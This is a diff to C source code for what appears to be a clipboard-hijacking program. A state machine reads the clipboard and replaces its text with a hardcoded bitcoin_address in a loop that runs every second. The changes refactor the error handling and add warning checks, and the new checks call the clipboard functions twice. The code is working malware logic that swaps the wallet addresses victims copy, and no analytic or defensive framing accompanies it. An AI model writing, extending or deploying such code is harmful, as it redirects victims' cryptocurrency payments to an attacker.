@@ -25,9 +25,13 @@ StateCodeProcess main(void)
         switch (state) {
             case STATE_ANALYZE_CLIPBOARD:
 
-                if (getClipboardText(buffer, buffer_size) == STATE_ERROR ) {
+                if (getClipboardText(buffer, buffer_size) == STATE_ERROR) {
                     printf("[ERROR] -- Failed to get clipboard text.\n");
                     return STATE_ERROR;
+                }
+
+                if (getClipboardText(buffer, buffer_size) == STATE_WARNING) {
+                    printf("[WARNING] -- Some issues could occur during the execution.\n");
                 }
 
                 int text_size = wcslen(buffer);
@@ -74,13 +78,17 @@ StateCodeProcess main(void)
 
             case STATE_MODIFY_CLIPBOARD:
 
-                if (!setClipboardText(bitcoin_address, size_bitcoin_address)) {
+                if (setClipboardText(bitcoin_address, size_bitcoin_address) == STATE_ERROR) {
+                    printf("[ERROR] -- Failed to set clipboard text.\n");
                     return STATE_ERROR;
                 }
-                else {
-                    Sleep(1000);
-                    state = STATE_ANALYZE_CLIPBOARD;
+
+                if (setClipboardText(bitcoin_address, size_bitcoin_address) == STATE_WARNING) {
+                    printf("[WARNING] -- Some issues could occur during the execution.\n");
                 }
+
+                Sleep(1000);
+                state = STATE_ANALYZE_CLIPBOARD;
 
                 break;
 
